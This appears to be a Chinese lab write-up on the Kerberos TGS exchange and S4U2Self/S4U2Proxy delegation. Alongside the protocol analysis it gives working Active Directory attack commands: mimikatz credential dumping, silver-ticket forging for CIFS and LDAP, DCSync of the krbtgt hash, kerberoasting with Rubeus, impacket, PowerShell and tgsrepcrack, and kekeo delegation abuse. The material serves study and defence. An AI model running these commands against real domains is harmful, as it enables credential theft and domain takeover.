## Kerberos协议流程

1.客户端将用户ID的明文消息发送给AS（请求认证）

2.AS检查客户端是否在其数据库中，在就会拿出相应用户id对应的hash来当作加密密钥。

    
    
    内容1：使用用户id对应的hash作为密钥加密的会话密钥（session key）
    内容2：使用KdrTGT 用户的hash作为密钥加密的TGT（TGT中包括用户id，客户端网络地址，票据有效信息和会话密钥（session key）
    

3.客户端接收内容1和内容2,使用用户输入的密码生成hash，当作解密密钥来解密内容1的内容，拿到会话密钥（session
key），然后生成下面两种内容信息发送给TGS

    
    
    内容1：使用KdrTGT 用户的hash作为密钥加密的TGT，以及要访问的服务id
    内容2：使用会话密钥（session key）加密的身份验证器（由客户端ID和时间戳组成）
    

4.TGS收到内容1和内容2，KdrTGT
用户的hash来解密TGT，拿到了（TGT）客户端id，会话密钥，再使用会话密钥解密内容2，得到（身份验证器）客户端id，然后比对两个客户端id是否一致，一致则通过认证，然后就用内容1中的服务id来找到对应的hash来作为密钥，返回给客户端两众内容：

    
    
    内容1：服务id对应的hash加密的客户端到服务器票证（包括客户端ID，客户端网络地址，有效期和客户端/服务器会话密钥）
    内容2:使用会话密钥（session key）加密的客户端/服务器会话密钥
    

5.客户端收到内容1和内容2后，使用会话密钥（session
key）解密内容2获得客户端/服务器会话密钥，然后发送两种内容给要访问的服务器（之前请求的服务id对应的服务）

    
    
    内容1：服务id对应的hash加密的客户端到服务器票证（包括客户端ID，客户端网络地址，有效期和客户端/服务器会话密钥）（上一个步骤的内容1）
    内容2：使用客户端/服务器会话密钥加密的一个新的身份验证器（其中包括客户端ID，时间戳记）
    

6.被请求的服务ss
拿到内容1和内容2，使用自己hash来作为密钥，来解密内容1，拿到客户端/服务器会话密钥和客户端ID，继续把拿到客户端/服务器会话密钥来解密内容2，获（新的身份验证器）得客户端ID，如果一致，就会返回内容给客户端，来表示回应。

    
    
    内容1：客户端/服务器会话密钥来加密的从内容2解密出来的时间戳
    

7.客户端使用客户端/服务器会话密钥解密确认（消息H），如果时间戳是否正确，则客户端可以信任服务器并可以开始向服务器发出服务请求

8.服务端响应请求。

接着上一篇Kerbroes协议学习之AS-REQ & AS-REP来继续学习，第一阶段AS-REQ & AS-REP完成了之后就到了TGS_REQ &
TGS_REP阶段了。这里继续使用daiker大佬的kerberos测试器来进行学习。到了TGS_REQ &
TGS_REP了其实用户已经拿到了TGT票据了，去向KDC申请特定服务的访问权限，KDC会校验TGT票据，如果校验通过的话，会向用户发送一个TGS票据，之后用户再拿着TGS去访问特定的服务。在这一阶段微软引入了两个用于委派的协议S4U2SELF和S4U2PROXY。

这一阶段把msg-type修改为KRB_TGS_REQ，然后勾选APREQ并且导入票据，并且加密需要勾选RC-4hmac。

![](https://image.3001.net/images/20210306/1615035498_60437c6a2eace56813770.png!small)

票据生成可以使用Rubeus来生成

    
    
    .\Rubeus.exe asktgt /user:user0x1 /password:q123456.

![](https://image.3001.net/images/20210306/1615035523_60437c8371114afae92dd.png!small)

请求到票据之后呢就使用powershell把Base64加密的ticket转换为ticket.kirbi票据然后在kerberos测试器导入TGT票据

    
    
    [IO.File]::WriteAllBytes("绝对路径\TGS\ticket.kirbi", [Convert]::FromBase64String("得到的base64"))

![](https://image.3001.net/images/20210306/1615035541_60437c957bc483d0f3eed.png!small)

或者使用kerberos测试器也是可以导出票据的。

![](https://image.3001.net/images/20210306/1615035559_60437ca7bdf628453a062.png!small)

## TGS_REQ数据包请求

经过之前的验证之后呢，客户端就会获得了一个TGT的票据和Login Session Key（也就是用用户hash加密的那个。）接着解开Login
Session Key获取解开的Login Session
Key。下一步的流程就是客户端需要访问某台服务器中开启的服务，那么客户端下一步就要去带着这一张TGT票据获取到一张ST票据，客户端会去访问KDC的TGS（Ticket
Granting Service）服务。在这一个阶段会关乎到委派的问题，一开始的非约束委派已经太危险了，然后微软扩展了两个协议S4u2self 和
S4u2Proxy。

![](https://image.3001.net/images/20210306/1615035584_60437cc073d4556c423fa.png!small)

> msg-type：类型,TGS_REQ对应的是 krb-tgs-req(12)
>
> PA-> DATA：padata中包含ap_req,这个是TGS_REQ必须携带的部分,这部分会携带AS_REP里面获取到的TGT票据（就是刚刚导入票据的那个部分就是APREQ）。还有可能会有PA_FOR_USER（在APREQ选项下面有一个S4U2SELF，可以指定用户），类型是S4U2SELF,是一个唯一的标识符，该标识符指示用户的身份，该标识符由用户名和域名组成。S4U2Proxy必须扩展PA_FOR_USER结构，指定服务代表某个用户去请求针对服务自身的kerberos服务票据。还有可能会有PA_PAC_OPTIONS，类型是PA_PAC_OPTIONS，​​S4U2Proxy必须扩展PA-> PAC-OPTIONS结构。如果是基于资源的约束委派，就需要指定Resource-based Constrained Delegation位。

![](https://image.3001.net/images/20210306/1615035615_60437cdf677bb53c3164e.png!small)

![](https://image.3001.net/images/20210306/1615035607_60437cd73762ba22c1839.png!small)

ap-req：PA-DATA包含的一个字段，上一阶段AS_REP发来的TGT就在里面，用于发往KDC验证。

![](https://image.3001.net/images/20210306/1615035636_60437cf4d11f5fa459c2f.png!small)

req-body：请求的主体

> realm：域名
>
>
> sname：这个是要请求的服务，TGS_REP获得的ticket是用该服务用户的hash进行加密的。有个比较有意思的特性是，如果指定的服务是krbtgt，那么拿到的TGS票据是可以当做TGT票据用的。

接着TGS接收到了请求之后会检查自身是否存在客户端所请求的服务。如果服务存在，则通过 krbtgt 用户的NTLM Hash 解密TGT并得到Login
Session Key，然后通过Login Session Key解密Authenticator，如果解密成功，则验证了对方的真实-身份，同时还会验证时间戳是否在范围内。并且还会检查TGT中的时间戳是否过期，且原始地址是否和TGT中保存的地址相同。在完成上述的检测后，如果验证通过，则TGS完成了对客户端的认证，会生成一个用Logon
Session Key加密后的用于确保客户端-服务器之间通信安全的Service Session Key会话秘钥(也就是最外层enc-part部分)。并且会为该客户端生成ST服务票据。ST服务票据主要包含两方面的内容：客户端用户信息 和 原始Service Session
Key，整个ST服务票据用该服务的NTLM Hash进行加密。最终Service Session Key 和 ST服务票据
发送给客户端。(这一步不管用户有没有访问服务的权限，只要TGT正确，就都会返回ST服务票据，这也是kerberoasting能利用的原因，任何一个用户，只要hash正确，就可以请求域内任何一个服务的ST票据)

## TGS_REQ数据回复包

![](https://image.3001.net/images/20210306/1615035677_60437d1d25d63e180b957.png!small)

> msg-type：AS_REQ的响应body对应的就是KRB_TGS_REQ(13)
>
> ticket：这就是ST服务票据
>
> 内层的enc-> part：这部分是用请求服务的密码Hash加密的。因此如果我们拥有服务的密码Hash，那么我们就可以自己制作一个ST服务票据，这就造成了白银票据攻击。正因为是使用要请求的服务的hash加密的，所以我们可以通过爆破enc_part获得该服务的hash。这就是kerberosting攻击了。
>
> 外层enc-part：这部分是可以解密的，key是上一轮AS_REP里面返回的session_key,也就是导入凭据里面的
> session_key，解密后得到encryptionkey，encryptionkey这个结构里面最重要的字段也是session_key(但是这个session_key
> 不同于上一轮里面的session_key)，用来作为作为下阶段的认证密钥。

## TGS_REQ & TGS_REP中的安全问题之白银票据攻击

TGS_REP数据包中内层的enc-part加密是使用服务的Hash进行加密的，如果我们拿到了服务用户的hash之后我们就可以制作白银票据来进行攻击了，居然我们需要什么功能就会有什么样的服务。参考这里
How Attackers Use Kerberos Silver Tickets to Exploit Systems
<https://adsecurity.org/?p=2011>

![](https://image.3001.net/images/20210306/1615035709_60437d3da64adcd6a461e.png!small)

**要创建白银票据，我们需要知道以下信息：**

> 要伪造的域用户(这里我们一般填写域管理员账户)
>
> 域名
>
> 域的SID值(就是域成员SID值去掉最后的)
>
> 目标服务的FQDN
>
> 可利用的服务
>
> 服务账号的NTLM哈希

CIFS服务通常用于Windows主机之间的文件共享。首先我们在当前机器上是不能够访问得到域控的共享目录的。

![](https://image.3001.net/images/20210306/1615035724_60437d4c2e3278c3c8cb6.png!small)

使用mimikatz获取服务账号的NTLM哈希值

    
    
    privilege::Debug
    sekurlsa::logonpasswords
    

我这里提供CIFS服务的是域控制器，它的NTLM Hashi为：9ef72d8aecd911dc6e655db161411960

![](https://image.3001.net/images/20210306/1615035737_60437d599d453f3b48e37.png!small)

在伪造票据之前先清空当前系统中的票据。

    
    
    klist purge
    

然后使用mimikatz生成伪造的白银票据。

    
    
    kerberos::golden /domain:eve.com /sid:S-1-5-21-3445932950-957411282-1849150570 /target:dc.eve.com /service:cifs /rc4:9ef72d8aecd911dc6e655db161411960 /user:hacker /ptt

![](https://image.3001.net/images/20210306/1615035757_60437d6db16019b1585a4.png!small)

这个时候在访问DC的C盘目录，这个时候已经有权限访问了

![](https://image.3001.net/images/20210306/1615035770_60437d7a5ddd1a2a630b6.png!small)

使用白银票据伪造LDAP访问权限，使用dcsync从域控制器中获取指定用户的账号和密码散列值。

    
    
    lsadump::dcsync /dc:dc.eve.com /domain:eve.com /user:krbtgt
    

这个时候没有访问域控制器的权限，所有不能从域控制器中获取指定用户的账号和密码散列

![](https://image.3001.net/images/20210306/1615035788_60437d8c6544706ccd816.png!small)

在域控制器中使用mimikatz获取服务账号的NTLM Hash

    
    
    mimikatz "privilege::debug" "sekurlsa::logonpasswords"
    

获取了域控制器中服务账号的NTLM Hash

![](https://image.3001.net/images/20210306/1615035804_60437d9c66555c92976f2.png!small)

使用mimikatz生成伪造的白银票据。

    
    
    kerberos::golden /domain:eve.com /sid:S-1-5-21-3445932950-957411282-1849150570 /target:dc.eve.com /service:LDAP /rc4:9ef72d8aecd911dc6e655db161411960 /user:hacker /ptt
    

![](https://image.3001.net/images/20210306/1615036176_60437f10789ffbffe819e.png!small)

再次使用dcsync从域控制器中获取指定用户的账号和密码散列值，这次成功了

    
    
    lsadump::dcsync /dc:dc.eve.com /domain:eve.com /user:krbtgt

![](https://image.3001.net/images/20210306/1615036207_60437f2faad36d9d857c0.png!small)

## TGS_REQ & TGS_REP中的安全问题之kerberosting攻击

TGS_REP数据包中内层的enc-part加密是使用服务的Hash进行加密的所以我们可以通过爆破获得服务的hash。所以我们可以通过爆破获得服务的hash。这个问题存在的另外一个因素是因为用户向KDC发起TGS_REQ请求，不管用户对服务有没有访问权限，只要TGT正确，那么肯定会返回TGS。其实AS_REQ里面的服务就是krbtgt，也就是说这个同样用于爆破AS_REP里面的ticket部分的encpart得到krbtgt的hash，但是之所以在网上没见到这种攻击方式是因为krbtgt的密码是随机生成的，也跑不出来.

> 第一步我们对域进行身份验证获取一个TGT
>
> 获取到了TGT之后需要向某个特点资源发出ST服务票据请求，该请求会通过SPN来获取到服务
>
> 当攻击者发出的TGT是对该服务有权限的时候，DC 将从TGT认购权证 中提取信息并填充到ST服务票据中。 然后，域控制器查找哪个帐户在
> ServicedPrincipalName 字段中注册了所请求的 SPN。 ST服务票据使用注册了所要求的 SPN 的帐户的NTLM哈希进行加密,
> 并使用攻击者和服务帐户共同商定的加密算法。 ST服务票据以服务票据回复(TGS-REP)的形式发送回攻击者。
>
> 接着我们从TGS-REP
> 中提取加密的服务票证，服务票据是使用请求到SPN服务的账号hash加密的，所以我们获取到票据之后可以离线破解获取账账号的明文密码

一开始我们需要先注册一个SPN

    
    
    setspn -A http/nginx user0x1  # 注册SPN
    setspn -T domain -q */*    # 查询域内的SPN服务
    setspn -L  one.com/user0x1  # 查询指定用户的SPN服务
    

Rubeus有一个kerberoast支持对所有用户或者特定用户执行kerberoasting操作，原理也是安装kerberos来请求到特点服务SPN，接着发送TGS数据包请求，把获取到的内层的enc-part加密，经过转换打印出可以直接hashcat爆破格式的hash

![](https://image.3001.net/images/20210306/1615036238_60437f4e490e6d59e162c.png!small)

神器impacket中的GetUserSPNS.py可以请求指定用户的SPN服务票据，这个脚本指定一个用户，并且输入其密码，接着请求成功之后就会返回一个可以直接hashcat爆破的hash

![](https://image.3001.net/images/20210306/1615036259_60437f6383a936baa2749.png!small)

通过powershell命令请求，请求指定SPN的服务票据

    
    
    $SPNName = 'MSSQLSvc/user0x1.one.com'
    Add-Type -AssemblyNAme System.IdentityModel
    New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPNName
    

请求所有TGS

    
    
    Add-Type -AssemblyName System.IdentityModel  
    setspn.exe -q */* | Select-String '^CN' -Context 0,1 | % { New-Object System. IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }  
    

或者通过mimikatz请求票据

    
    
    #请求服务票据
    kerberos::ask /target:MSSQLSvc/user0x1.one.com
    #列出服务票据
    kerberos::list  
    

接着在使用mimikatz提取里面的票据，会返回一个kirbi的票据，使用hashcat

    
    
    mimikatz # kerberos::list /export
    

使用 tgsrepcrack 爆破票据

    
    
    ./tgsrepcrack.py wordlist.txt test.kirbi
    

Empire下的Invoke-Kerberoast.ps1也可以导出Hashcat格式的票据

![](https://image.3001.net/images/20210306/1615036278_60437f76317209a26efa7.png!small)

接着把导出来可以通过hashcat爆破的hash拿来爆破，这里可以爆破出来

![](https://image.3001.net/images/20210306/1615036295_60437f87a80fbb2d02835.png!small)

## Kerbroes扩展协议分析之S4u2Self & S4u2Proxy

在进行约束委派的时候微软有扩展两个子协议到Kerberos的 TGS_REQ & TGS_REP 阶段中，它们就是S4u2Self (Service for
User to Self) 和 S4u2Proxy (Service for User to Proxy )。S4u2self
可以代表任意用户请求针对其自身的Kerberos服务票据(ST)；S4u2Proxy可以以上一步用户的名义请求其它服务的服务票据。约束性委派就是限制了
S4u2Proxy 扩展的范围。利用委派约束可以看一下这篇[文章](http://www.ji4n.cn/index.php/archives/2168/)

![](https://image.3001.net/images/20210306/1615036377_60437fd914e2650e1af36.png!small)

<https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/1fb9caca-449f-4183-8f7a-1a5fc7e7290a>

>
> 用户向service1发出请求。用户已通过身份验证，但service1没有用户的授权数据。通常，这是由于身份验证是通过Kerberos以外的其他方式验证的。
>
> 通过S4U2self扩展以用户的名义向KDC请求用于访问service1的ST1。
>
> KDC返回给Service1一个用于用户验证Service1的ST1，该ST1可能包含用户的授权数据。
>
> service1可以使用ST中的授权数据来满足用户的请求，然后响应用户。
    
    
    注：尽管S4U2self向service1提供有关用户的信息，但S4U2self不允许service1代表用户发出其他服务的请求，这时候就轮到S4U2proxy发挥作用了
    

1.用户向service1发出请求，service1需要以用户身份访问service2上的资源。

2.service1以用户的名义向KDC请求用户访问service2的ST2

3.如果请求中包含PAC，则KDC通过检查PAC的签名数据来验证PAC
，如果PAC有效或不存在，则KDC返回ST2给service1，但存储在ST2的cname和crealm字段中的客户端身份是用户的身份，而不是service1的身份。

4.service1使用ST2以用户的名义向service2发送请求，并判定用户已由KDC进行身份验证。

5.service2响应步骤8的请求。

6.service1响应用户对步骤5中的请求。

## S4u2Self

当你需要访问一个服务的时候，用户是无法向服务器提供请求该服务的ST服务票据的，这一步需要服务端利用s4u2self向KDC为任意用户请求访问自身的可转发的服务票据  
S4U2self 使得服务可以代表用户获得针对服务自身的kerberos服务票据。这使得服务可以获得用户的授权( 可转发
的用户TGS票据)，然后将其用于后期的认证(主要是后期的s4u2proxy)，这是为了在用户以不使用 Kerberos
的方式对服务进行身份验证的情况下使用。这里面很重要的一点是服务代表用户获得针对服务自身的kerberos票据这个过程，服务是不需要用户的凭据的

![](https://image.3001.net/images/20210306/1615036400_60437ff08d2282831332b.png!small)

这一步中和之前的一样，导入TGT票据勾选APREQ，并且勾选S4USELF，这里的S4U2self扩展名代表用户administrator来
获得针对服务本身(也就是user0x1)的服务票证，类型为S4U2SELF

![](https://image.3001.net/images/20210306/1615036424_604380080435b8a467764.png!small)

这里勾选rc4mac加密，并且勾选forwardable，在实际中是TGS的本地策略允许，则TGS检验通过后必须将票证标志 字段设置为可转发

![](https://image.3001.net/images/20210306/1615036444_6043801ccf633c46c35d9.png!small)

在TGS_REQ的请求包中PA-DATA中有pA-FOR-USER的数据包，这就是S4U2self扩展名代表用户administrator来
获得针对服务本身(也就是user0x1)的服务票证

![](https://image.3001.net/images/20210306/1615036463_6043802f6c53526c9a108.png!small)

KDC检验通过后将ST服务票据的 票证标志 字段设置为可转发，发送给服务账号。主要检验以下几点：

> 1.TGT票据是否是可以转发的
>
> 2.服务是否配置了约束委派属性
>
> 3.服务是否请求了可转发选项

## S4u2Proxy

s4u2proxy 使得服务1可以使用来自用户的授权(
在S4U2SELF阶段获得)，然后用该TGS(放在AddtionTicket里面)向KDC请求访问服务2的TGS，并且代表用户访问服务2，而且只能访问服务2。

![](https://image.3001.net/images/20210306/1615036480_604380406d980c031104e.png!small)

这里使用请求krbtgt服务的数据包来(中间出现了一点问题哈哈哈!)，接着会带上S4U2self 请求获得票据，以 Administrator 的名义向
KDC 申请一张到 krbtgt/one.com的票（这里也可以是其他的，比如cifs，需要有委派）。接着会把上一阶段S4U2self
请求获得票据放到additional-tickets里面作为请求

![](https://image.3001.net/images/20210306/1615036496_60438050249ae456e2e47.png!small)

可以看到下面的图中，cname是administrator，sname是krbtgt。也就是KDC返回了以administrator请求回来的服务票据

![](https://image.3001.net/images/20210306/1615036517_60438065d77d9a8c07f4c.png!small)

约束委派的利用过程这里就不演示了，网上有很多非常优秀的文章，下面的文章是基于委派DC的cifs服务来实验的

![](https://image.3001.net/images/20210306/1615036561_60438091e8f30f681287f.png!small)

操作环境：  
域：networksec.loacl  
域控：windows server 2012R2，主机名：dc，IP：192.168.8.142，用户：administrator  
域内主机：windows server 2012R2，主机名：user，IP：192.168.8.141，用户：user0x1

约束委派整一个利用的过程产生了六个数据包

![](https://image.3001.net/images/20210306/1615036585_604380a9bed5ae9e38372.png!small)

一开始我们第一步就是利用我们已经控制到的一个域用户来申请一个TGT的票据。这里使用kekeo工具来进行操作

    
    
    tgt::ask /user:user0x2 /domain:networksec.loacl /password:q123456. /ticket:wptgt.kirbi
    

可以看到一开始请求的数据包就是我们使用控制的账号来去申请一个TGT的票据

![](https://image.3001.net/images/20210306/1615036604_604380bc65884e863e0d3.png!small)

验证通过之后KDC就会返回一个票据给攻击者，可以看到ticket里面就是我们使用工具kekeo申请下来的票据TGT_user0x1@one.com_krbtgt~one.com@one.com.kirbi

![](https://image.3001.net/images/20210306/1615036635_604380db654379ef5083d.png!small)

接下里就是S4u2self & S4u2Proxy的过程了。对应了下面的命令

    
    
    Tgs::s4u /tgt:TGT_administrator@one.com_krbtgt~one.com@one.com.kirbi /user:administrator@one.com /service:cifs/dc.one.com
    

一开始的TGS就是S4u2self ，以administrator的名义来请求一张TGS的票据。S4u2self 字面上的意思就是server for
user to self，这里就是自己请求自己的票据，所以sname和cname都是自己。接着TGS_REP就直接把票据返回-回来了

![](https://image.3001.net/images/20210306/1615036656_604380f0e4e5afcdc55a3.png!small)

最后就是S4u2proxy了，可也看到这一步的话会把上一步S4u2self获取的票据放到additional-tickets里面。并且请求的就是委派的服务cifs

![](https://image.3001.net/images/20210306/1615036676_604381049640970836490.png!small)

接着就会返回一个票据回来TGT_administrator@ONE.COM_krbtgt~one.com@ONE.COM.kirbi。这个票据就是通过S4u2proxy生成，用来mimikatz
导入获取高权限的那个票据。

![](https://image.3001.net/images/20210306/1615036692_604381145c1de76d3cdbe.png!small)

![](https://image.3001.net/images/20210306/1615036703_6043811f50afbe39c8285.png!small)

